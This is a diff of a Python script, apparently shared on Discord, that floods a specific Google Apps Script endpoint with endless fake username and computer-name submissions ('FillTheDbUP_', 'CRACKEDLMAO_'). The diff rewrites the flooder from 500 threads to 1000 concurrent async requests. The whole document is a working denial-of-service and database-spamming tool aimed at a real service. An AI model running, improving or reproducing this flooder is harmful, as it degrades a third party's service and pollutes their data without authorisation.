@@ -1,35 +1,36 @@
-print("script made by msgpack on discord")
+print("script made by msgpack on discord, optimized by pom")
 
-import requests
-import urllib.parse
-import os
+import asyncio
+import httpx
 import random
 import string
-import threading
-def INDIAUP(length=5):
+
+def generate_id(length=5):
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
 
-def boom():
-  while True:
-    username = f"FillTheDbUP_{INDIAUP()}"
-    compName = f"CRACKEDLMAO_{INDIAUP()}"
-    encodedUser = urllib.parse.quote(username)
-    encodedPC = urllib.parse.quote(compName)
-    fullURL = f"https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec?username={encodedUser}&computer={encodedPC}"
-    response = requests.get(fullURL)
-    if response.status_code == 200:
-        print("done", response.text)
-    else:
-      pass
+async def send_request(client):
+    while True:
+        username = f"FillTheDbUP_{generate_id()}"
+        computer = f"CRACKEDLMAO_{generate_id()}"
+        params = {
+            'username': username,
+            'computer': computer
+        }
+        try:
+            r = await client.get(
+                "https://script.google.com/macros/s/AKfycbyaY3CJTgG2ZV3HxY6d30K3t-PAhJKCVeJU9RSAziSoAmxBiWhY06ATUVDQJ2z39S_-/exec",
+                params=params,
+                timeout=10
+            )
+            if r.status_code == 200:
+                print("done", r.text)
+        except httpx.RequestError:
+            pass
 
-def sigmarizzler(num_threads=10):
-    threads = []
+async def main(concurrency=1000):
+    async with httpx.AsyncClient() as client:
+        tasks = [send_request(client) for _ in range(concurrency)]
+        await asyncio.gather(*tasks)
 
-    for _ in range(num_threads):
-        thread = threading.Thread(target=boom)
-        threads.append(thread)
-        thread.start()
-    for thread in threads:
-        thread.join()
+asyncio.run(main())
 
-sigmarizzler(500)
